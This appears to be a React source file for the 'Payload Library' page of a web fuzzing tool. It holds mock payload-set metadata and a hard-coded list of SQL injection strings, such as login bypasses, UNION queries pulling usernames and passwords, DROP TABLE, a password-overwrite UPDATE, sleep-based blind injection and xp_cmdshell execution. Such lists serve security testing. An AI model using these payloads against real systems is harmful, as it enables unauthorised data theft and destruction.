
import React, { useState } from 'react';
import Navbar from '@/components/Navbar';
import Sidebar from '@/components/Sidebar';
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { 
  Card, 
  CardContent, 
  CardHeader, 
  CardTitle, 
  CardDescription,
  CardFooter
} from "@/components/ui/card";
import { 
  Table, 
  TableBody, 
  TableCell, 
  TableHead, 
  TableHeader, 
  TableRow 
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { 
  Database, 
  Plus, 
  Search, 
  MoreVertical, 
  Edit, 
  Trash, 
  Copy,
  Download,
  FileUp,
  Tag,
  Filter,
  Book
} from 'lucide-react';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { toast } from "sonner";
import { ScrollArea } from "@/components/ui/scroll-area";

// Mock data for payloads
const mockPayloads = [
  { 
    id: 1, 
    name: 'SQL Injection Basic', 
    description: 'Common SQL injection payloads', 
    category: 'SQL Injection',
    count: 25,
    lastUsed: '2023-05-12T14:20:00'
  },
  { 
    id: 2, 
    name: 'XSS Attacks', 
    description: 'Cross-site scripting attack payloads', 
    category: 'XSS',
    count: 35,
    lastUsed: '2023-05-10T10:30:00'
  },
  { 
    id: 3, 
    name: 'Path Traversal', 
    description: 'Directory traversal attack payloads', 
    category: 'Path Traversal',
    count: 15,
    lastUsed: '2023-05-11T09:15:00'
  },
  { 
    id: 4, 
    name: 'Command Injection', 
    description: 'Payloads for injecting OS commands', 
    category: 'Command Injection',
    count: 20,
    lastUsed: '2023-05-09T16:45:00'
  },
  { 
    id: 5, 
    name: 'SSRF Vectors', 
    description: 'Server-side request forgery payloads', 
    category: 'SSRF',
    count: 18,
    lastUsed: '2023-05-10T11:50:00'
  },
];

// Example payloads for the selected category
const sqlInjectionPayloads = [
  "' OR 1=1--",
  "' OR '1'='1",
  "' OR 1=1 /*",
  "') OR ('1'='1",
  "1' OR '1' = '1",
  "' UNION SELECT 1,2,3--",
  "' UNION SELECT username,password,3 FROM users--",
  "admin' --",
  "admin' #",
  "' OR 1=1 LIMIT 1;--",
  "1'; DROP TABLE users--",
  "1'; UPDATE users SET password='hacked' WHERE username='admin'--",
  "' OR id IS NOT NULL; --",
  "' OR username LIKE '%admin%'--",
  "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a); --",
  "'; WAITFOR DELAY '0:0:5'--",
  "' OR IF(1=1, SLEEP(5), 0)--",
  "' OR SLEEP(5)--",
  "' AND SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
  "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
  "'; BEGIN DECLARE @var VARCHAR(8000); SET @var=':'; EXEC master.dbo.xp_cmdshell @var; --",
  "'; exec master..xp_cmdshell 'ping 127.0.0.1'; --",
  "' UNION SELECT @@version --",
  "'; SELECT * FROM INFORMATION_SCHEMA.TABLES --"
];

const PayloadLibrary = () => {
  const [sidebarOpen, setSidebarOpen] = useState(false);
  const [payloads, setPayloads] = useState(mockPayloads);
  const [searchTerm, setSearchTerm] = useState('');
  const [showAddDialog, setShowAddDialog] = useState(false);
  const [showPayloadDialog, setShowPayloadDialog] = useState(false);
  const [selectedPayloadSet, setSelectedPayloadSet] = useState<{id: number, name: string, category: string} | null>(null);
  const [newPayloadSet, setNewPayloadSet] = useState({
    name: '',
    description: '',
    category: '',
    payloads: ''
  });
  const [activeTab, setActiveTab] = useState("list");

  // Filter payloads based on search term
  const filteredPayloads = payloads.filter(payload => 
    payload.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
    payload.description.toLowerCase().includes(searchTerm.toLowerCase()) ||
    payload.category.toLowerCase().includes(searchTerm.toLowerCase())
  );

  // Function to handle adding a new payload set
  const handleAddPayloadSet = () => {
    const id = Math.max(...payloads.map(p => p.id)) + 1;
    const payloadCount = newPayloadSet.payloads.split('\n').filter(line => line.trim() !== '').length;
    
    const newPayloadData = {
      id,
      name: newPayloadSet.name,
      description: newPayloadSet.description,
      category: newPayloadSet.category,
      count: payloadCount,
      lastUsed: '-'
    };
    
    setPayloads([...payloads, newPayloadData]);
    setShowAddDialog(false);
    setNewPayloadSet({ name: '', description: '', category: '', payloads: '' });
    toast.success("Payload set added successfully");
  };

  // Function to delete payload set
  const deletePayloadSet = (id: number) => {
    setPayloads(prev => prev.filter(payload => payload.id !== id));
    toast.success("Payload set deleted successfully");
  };

  // Function to copy a payload to clipboard
  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    toast.success("Payload copied to clipboard");
  };

  // Function to view payloads
  const viewPayloads = (payload: {id: number, name: string, category: string}) => {
    setSelectedPayloadSet(payload);
    setShowPayloadDialog(true);
  };

  // Function to import payloads
  const importPayloads = () => {
    toast.success("Import feature would be implemented here");
  };

  // Function to export payloads
  const exportPayloads = () => {
    toast.success("Payloads exported successfully");
  };

  const toggleSidebar = () => {
    setSidebarOpen(!sidebarOpen);
  };

  const closeSidebar = () => {
    setSidebarOpen(false);
  };

  return (
    <div className="min-h-screen bg-background text-foreground flex flex-col">
      <Navbar toggleSidebar={toggleSidebar} />
      
      <div className="flex flex-1 overflow-hidden">
        <Sidebar isOpen={sidebarOpen} closeSidebar={closeSidebar} />
        
        <main className="flex-1 p-4 pt-6 lg:pl-[17rem] overflow-auto">
          <div className="max-w-[1200px] mx-auto space-y-6">
            <div className="flex flex-col md:flex-row items-start justify-between gap-4 mb-6">
              <div>
                <h1 className="text-2xl font-bold tracking-tight">Payload Library</h1>
                <p className="text-muted-foreground">
                  Manage and organize your fuzzing payloads for various attack vectors
                </p>
              </div>
              
              <div className="flex gap-2 w-full md:w-auto justify-end">
                <Dialog open={showAddDialog} onOpenChange={setShowAddDialog}>
                  <DialogTrigger asChild>
                    <Button className="bg-fuzzer-primary hover:bg-fuzzer-secondary flex gap-2">
                      <Plus className="h-4 w-4" />
                      <span>Add Payloads</span>
                    </Button>
                  </DialogTrigger>
                  <DialogContent className="max-w-[650px]">
                    <DialogHeader>
                      <DialogTitle>Add New Payload Set</DialogTitle>
                      <DialogDescription>
                        Enter the details and payloads for the new set. Each payload should be on a new line.
                      </DialogDescription>
                    </DialogHeader>
                    <div className="grid gap-4 py-4">
                      <div className="grid gap-2">
                        <label htmlFor="name">Name</label>
                        <Input 
                          id="name" 
                          value={newPayloadSet.name} 
                          onChange={(e) => setNewPayloadSet({...newPayloadSet, name: e.target.value})}
                          placeholder="e.g., SQL Injection Advanced"
                        />
                      </div>
                      <div className="grid gap-2">
                        <label htmlFor="category">Category</label>
                        <Input 
                          id="category" 
                          value={newPayloadSet.category} 
                          onChange={(e) => setNewPayloadSet({...newPayloadSet, category: e.target.value})}
                          placeholder="e.g., SQL Injection"
                        />
                      </div>
                      <div className="grid gap-2">
                        <label htmlFor="description">Description</label>
                        <Input 
                          id="description" 
                          value={newPayloadSet.description} 
                          onChange={(e) => setNewPayloadSet({...newPayloadSet, description: e.target.value})}
                          placeholder="Describe this payload set"
                        />
                      </div>
                      <div className="grid gap-2">
                        <label htmlFor="payloads">Payloads (one per line)</label>
                        <Textarea 
                          id="payloads" 
                          value={newPayloadSet.payloads} 
                          onChange={(e) => setNewPayloadSet({...newPayloadSet, payloads: e.target.value})}
                          placeholder="' OR 1=1-- 
' UNION SELECT 1,2,3--
admin' --"
                          className="min-h-[200px] font-mono text-sm"
                        />
                      </div>
                    </div>
                    <DialogFooter>
                      <Button variant="outline" onClick={() => setShowAddDialog(false)}>Cancel</Button>
                      <Button onClick={handleAddPayloadSet}>Add Payload Set</Button>
                    </DialogFooter>
                  </DialogContent>
                </Dialog>
                
                <Dialog open={showPayloadDialog} onOpenChange={setShowPayloadDialog}>
                  <DialogContent className="max-w-[650px]">
                    <DialogHeader>
                      <DialogTitle>
                        {selectedPayloadSet?.name} ({selectedPayloadSet?.category})
                      </DialogTitle>
                      <DialogDescription>
                        View and copy individual payloads from this set
                      </DialogDescription>
                    </DialogHeader>
                    <ScrollArea className="h-[400px] border rounded-md p-4">
                      <div className="space-y-2">
                        {sqlInjectionPayloads.map((payload, index) => (
                          <div key={index} className="flex items-center justify-between border p-2 rounded bg-secondary/30">
                            <code className="text-sm font-mono">{payload}</code>
                            <Button variant="ghost" size="icon" onClick={() => copyPayload(payload)}>
                              <Copy className="h-4 w-4" />
                            </Button>
                          </div>
                        ))}
                      </div>
                    </ScrollArea>
                    <DialogFooter>
                      <Button variant="outline" onClick={() => setShowPayloadDialog(false)}>Close</Button>
                      <Button onClick={exportPayloads}>Export All</Button>
                    </DialogFooter>
                  </DialogContent>
                </Dialog>
                
                <Button 
                  variant="outline"
                  className="gap-2"
                  onClick={importPayloads}
                >
                  <FileUp className="h-4 w-4" />
                  <span>Import</span>
                </Button>
                
                <Button 
                  variant="outline"
                  className="gap-2"
                  onClick={exportPayloads}
                >
                  <Download className="h-4 w-4" />
                  <span>Export</span>
                </Button>
              </div>
            </div>
            
            <Tabs value={activeTab} onValueChange={setActiveTab} className="w-full">
              <TabsList className="grid grid-cols-2 w-full mb-4 neo-blur">
                <TabsTrigger value="list" className="flex items-center gap-2 data-[state=active]:bg-fuzzer-primary data-[state=active]:text-primary-foreground">
                  <Database className="h-4 w-4" />
                  <span>Payload Sets</span>
                </TabsTrigger>
                <TabsTrigger value="categories" className="flex items-center gap-2 data-[state=active]:bg-fuzzer-primary data-[state=active]:text-primary-foreground">
                  <Tag className="h-4 w-4" />
                  <span>Categories</span>
                </TabsTrigger>
              </TabsList>
              
              <TabsContent value="list" className="space-y-4 fade-in">
                {/* Search and filter */}
                <div className="flex flex-col sm:flex-row justify-between mb-4 gap-2">
                  <div className="relative sm:w-[300px]">
                    <Search className="absolute left-2 top-2.5 h-4 w-4 text-muted-foreground" />
                    <Input 
                      placeholder="Search payloads..." 
                      className="pl-8" 
                      value={searchTerm}
                      onChange={(e) => setSearchTerm(e.target.value)}
                    />
                  </div>
                  <Button variant="outline" size="sm" className="gap-1">
                    <Filter className="h-4 w-4" />
                    <span>Filter</span>
                  </Button>
                </div>
                
                {/* Payloads table */}
                <Card className="glass-card">
                  <CardHeader className="pb-2">
                    <CardTitle className="flex items-center space-x-2">
                      <Database className="text-fuzzer-primary h-5 w-5" />
                      <span>Payload Sets</span>
                    </CardTitle>
                    <CardDescription>
                      {filteredPayloads.length} payload sets configured
                    </CardDescription>
                  </CardHeader>
                  <CardContent>
                    <div className="rounded-md border">
                      <Table>
                        <TableHeader>
                          <TableRow>
                            <TableHead>Name / Description</TableHead>
                            <TableHead className="w-[120px]">Category</TableHead>
                            <TableHead className="w-[100px]">Count</TableHead>
                            <TableHead className="w-[150px]">Last Used</TableHead>
                            <TableHead className="w-[100px]">Actions</TableHead>
                          </TableRow>
                        </TableHeader>
                        <TableBody>
                          {filteredPayloads.map((payload) => (
                            <TableRow key={payload.id} className="group">
                              <TableCell>
                                <div className="font-medium truncate w-40 md:w-auto">{payload.name}</div>
                                <div className="text-muted-foreground text-xs truncate w-40 md:w-auto">{payload.description}</div>
                              </TableCell>
                              <TableCell>
                                <Badge variant="outline" className="bg-fuzzer-primary/10 text-fuzzer-primary">
                                  {payload.category}
                                </Badge>
                              </TableCell>
                              <TableCell>
                                {payload.count} payloads
                              </TableCell>
                              <TableCell>
                                {payload.lastUsed === '-' ? '-' : new Date(payload.lastUsed).toLocaleString()}
                              </TableCell>
                              <TableCell>
                                <div className="flex items-center gap-1">
                                  <Button 
                                    variant="ghost" 
                                    size="icon" 
                                    className="size-8"
                                    onClick={() => viewPayloads({id: payload.id, name: payload.name, category: payload.category})}
                                  >
                                    <Book className="h-4 w-4" />
                                  </Button>
                                  <DropdownMenu>
                                    <DropdownMenuTrigger asChild>
                                      <Button variant="ghost" size="icon" className="size-8">
                                        <MoreVertical className="h-4 w-4" />
                                      </Button>
                                    </DropdownMenuTrigger>
                                    <DropdownMenuContent align="end">
                                      <DropdownMenuLabel>Actions</DropdownMenuLabel>
                                      <DropdownMenuSeparator />
                                      <DropdownMenuItem onClick={() => viewPayloads({id: payload.id, name: payload.name, category: payload.category})}>
                                        <Book className="h-4 w-4 mr-2" />
                                        View Payloads
                                      </DropdownMenuItem>
                                      <DropdownMenuItem>
                                        <Edit className="h-4 w-4 mr-2" />
                                        Edit
                                      </DropdownMenuItem>
                                      <DropdownMenuItem onClick={exportPayloads}>
                                        <Download className="h-4 w-4 mr-2" />
                                        Export
                                      </DropdownMenuItem>
                                      <DropdownMenuSeparator />
                                      <DropdownMenuItem 
                                        className="text-red-500"
                                        onClick={() => deletePayloadSet(payload.id)}
                                      >
                                        <Trash className="h-4 w-4 mr-2" />
                                        Delete
                                      </DropdownMenuItem>
                                    </DropdownMenuContent>
                                  </DropdownMenu>
                                </div>
                              </TableCell>
                            </TableRow>
                          ))}
                        </TableBody>
                      </Table>
                    </div>
                  </CardContent>
                </Card>
              </TabsContent>
              
              <TabsContent value="categories" className="space-y-4 fade-in">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                  {['SQL Injection', 'XSS', 'Path Traversal', 'Command Injection', 'SSRF', 'CSRF'].map((category, index) => (
                    <Card key={index} className="glass-card hover-scale transition-transform">
                      <CardHeader className="pb-2">
                        <CardTitle className="text-lg">{category}</CardTitle>
                        <CardDescription>
                          {Math.floor(Math.random() * 5) + 1} payload sets
                        </CardDescription>
                      </CardHeader>
                      <CardContent className="pb-2">
                        <p className="text-sm text-muted-foreground">
                          {category === 'SQL Injection' && 'Payloads designed to exploit SQL databases'}
                          {category === 'XSS' && 'Cross-site scripting attack vectors'}
                          {category === 'Path Traversal' && 'Directory traversal exploits'}
                          {category === 'Command Injection' && 'OS command execution techniques'}
                          {category === 'SSRF' && 'Server-side request forgery vectors'}
                          {category === 'CSRF' && 'Cross-site request forgery attacks'}
                        </p>
                      </CardContent>
                      <CardFooter>
                        <Button variant="outline" size="sm" className="w-full">View Payloads</Button>
                      </CardFooter>
                    </Card>
                  ))}
                </div>
              </TabsContent>
            </Tabs>
          </div>
        </main>
      </div>
    </div>
  );
};

export default PayloadLibrary;
